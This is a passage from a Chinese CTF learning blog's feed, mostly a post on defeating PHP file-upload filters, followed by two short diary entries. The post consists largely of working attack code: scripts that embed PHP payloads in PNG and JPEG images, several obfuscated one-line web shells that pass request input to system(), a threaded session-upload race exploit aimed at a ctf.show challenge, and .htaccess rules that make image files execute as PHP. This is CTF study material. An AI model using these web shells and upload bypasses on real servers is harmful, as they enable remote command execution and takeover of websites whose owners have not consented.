class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; sizeof(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = imagecolorallocate(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   imagesetpixel(<span class="variable">$img</span>, round(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng(<span class="variable">$img</span>,<span class="string">&#x27;./1.png&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># ?0=call_user_func post 1=ls</span></span><br><span class="line"><span class="comment"># ?0=system 1=whoami</span></span><br><span class="line"></span><br><span class="line">利用抓包看信息，可能不回显</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="jpg格式"><a href="#jpg格式" class="headerlink" title="jpg格式"></a>jpg格式</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1=phpinfo();</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(!extension_loaded(<span class="string">&#x27;gd&#x27;</span>) || !function_exists(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_error_handler(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> DataInputStream(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = file_get_contents(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readShort() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;eof()) &amp;&amp; (<span class="variable">$dis</span>-&gt;readByte() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;readByte();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;readShort() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;skip(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;seek();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    substr(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    str_repeat(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    substr(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                checkImage(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;eof())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;seek() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        substr(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                substr(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                substr(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(checkImage(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        file_put_contents(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        imagecreatefromjpeg(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            unlink(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!file_exists(<span class="variable">$filename</span>) || !is_file(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = file_get_contents(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;size = strlen(<span class="keyword">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;size - strlen(<span class="keyword">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;eof()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> ord(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (ord(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (ord(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;binData||(strlen(<span class="keyword">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="免杀马"><a href="#免杀马" class="headerlink" title="免杀马"></a>免杀马</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;s#y#s#t#e#m&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = explode(<span class="string">&quot;#&quot;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$b</span>[<span class="number">0</span>].<span class="variable">$b</span>[<span class="number">1</span>].<span class="variable">$b</span>[<span class="number">2</span>].<span class="variable">$b</span>[<span class="number">3</span>].<span class="variable">$b</span>[<span class="number">4</span>].<span class="variable">$b</span>[<span class="number">5</span>];</span><br><span class="line"><span class="variable">$c</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=substr(<span class="string">&#x27;1s&#x27;</span>,<span class="number">1</span>).<span class="string">&#x27;ystem&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=strrev(<span class="string">&#x27;metsys&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">a=system&amp;b=ls</span><br></pre></td></tr></table></figure><h2 id="session竞争上传"><a href="#session竞争上传" class="headerlink" title="session竞争上传"></a>session竞争上传</h2><p>先上传.user.ini包含如下语句</p><pre><code>&lt;?=include&quot;/tmp/sess_haorical&quot;?&gt;</code></pre><p>跑脚本</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">session=requests.session()</span><br><span class="line">sess=<span class="string">&#x27;haorical&#x27;</span></span><br><span class="line">url1=<span class="string">&quot;http://f275f432-9203-4050-99ad-a185d3b6f466.chall.ctf.show/&quot;</span></span><br><span class="line">url2=<span class="string">&quot;http://f275f432-9203-4050-99ad-a185d3b6f466.chall.ctf.show/upload&quot;</span></span><br><span class="line">data1=&#123;</span><br><span class="line"><span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">file=&#123;</span><br><span class="line"><span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;heiheihei&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookies=&#123;</span><br><span class="line"><span class="string">&#x27;PHPSESSID&#x27;</span>: sess</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>():</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">r = session.post(url1,data=data1,files=file,cookies=cookies)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>():</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">r = session.get(url2)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br><span class="line">threads = [threading.Thread(target=write),</span><br><span class="line">       threading.Thread(target=read)]</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">t.start()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="htaccess绕过"><a href="#htaccess绕过" class="headerlink" title=".htaccess绕过"></a>.htaccess绕过</h2><p>上传.htaccess</p><p>内容如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .png   //将.png后缀的文件解析 成php</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">png</span>&quot;&gt;</span></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br><span class="line"></span><br><span class="line">php_value auto_prepend_file &quot;shell.png&quot; </span><br><span class="line">#效果和.user.ini一样，然后通过访问加载php页面可以触发.htaccess的指令</span><br></pre></td></tr></table></figure><h2 id="appach解析漏洞"><a href="#appach解析漏洞" class="headerlink" title="appach解析漏洞"></a>appach解析漏洞</h2><p>apache遇到无法识别解析的文件后缀时，会向前解析，如xxx.php.123.456,在mime.types文件中如果不存在.123/.456这两种后缀，那么apache会将该文件解析为php。</p><p>比如1.php.jgp</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;基本思路&quot;&gt;&lt;a href=&quot;#基本思路&quot; class=&quot;headerlink&quot; title=&quot;基本思路&quot;&gt;&lt;/a&gt;基本思路&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;绕过各种前端过滤&lt;/li&gt;
&lt;li&gt;上传.user.ini/.htaccess&lt;/li&gt;
&lt;li&gt;上传包含一句话</summary>
      
    
    
    
    <category term="ctf学习" scheme="http://blog.haorical.top/categories/ctf%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="web" scheme="http://blog.haorical.top/tags/web/"/>
    
    <category term="文件上传" scheme="http://blog.haorical.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>20211031</title>
    <link href="http://blog.haorical.top/posts/161306f5/"/>
    <id>http://blog.haorical.top/posts/161306f5/</id>
    <published>2021-10-30T20:16:02.000Z</published>
    <updated>2021-10-30T20:24:39.546Z</updated>
    
    <content type="html"><![CDATA[<p>失眠了，想了想不知道干什么</p><p>刚开始玩了会古墓丽影，不想玩了</p><p>想到前段时间服务器好像坏了，又修了修，重新在服务器上把博客搭好了</p><p>现在博客Github上和服务器上的都能用</p><p>之所以保留Github是因为足够稳定，用的是一级域名，<a href="https://haorical.xyz/">https://haorical.xyz</a></p><p>服务器用的阿里云，国内比较快，用的二级域名，<a href="http://blog.haorical.xyz/">http://blog.haorical.xyz</a></p><p>暂时没部署证书，以后再弄吧，现在不想弄了。</p><p>又不知道干啥了，过两天生日，一点感觉都没有，明天还得复习线代还得打比赛。。。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;失眠了，想了想不知道干什么&lt;/p&gt;
&lt;p&gt;刚开始玩了会古墓丽影，不想玩了&lt;/p&gt;
&lt;p&gt;想到前段时间服务器好像坏了，又修了修，重新在服务器上把博客搭好了&lt;/p&gt;
&lt;p&gt;现在博客Github上和服务器上的都能用&lt;/p&gt;
&lt;p&gt;之所以保留Github是因为足够稳定，用的是一级域</summary>
      
    
    
    
    <category term="随笔" scheme="http://blog.haorical.top/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
  </entry>
  
  <entry>
    <title>20211018</title>
    <link href="http://blog.haorical.top/posts/5df9dcd3/"/>
    <id>http://blog.haorical.top/posts/5df9dcd3/</id>
    <published>2021-10-18T13:27:21.000Z</published>
    <updated>2021-10-30T20:14:20.104Z</updated>
    
    <content type="html"><![CDATA[<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;BJDCTF2020-Mark-loves-cat&quot;&gt;&lt;a href=&quot;#BJDCTF2020-Mark-loves-cat&quot; class=&quot;headerlink&quot; title=&quot;[BJDCTF2020]Mark loves cat&quot;&gt;&lt;/a&gt;[BJDCTF202</summary>
      
    
    
    
    <category term="ctf每日一题" scheme="http://blog.haorical.top/categories/ctf%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"/>
    
    
    <category term="ctf" scheme="http://blog.haorical.top/tags/ctf/"/>
    
    <category term="web" scheme="http://blog.haorical.top/tags/web/"/>
    
  </entry>
  
  <entry>
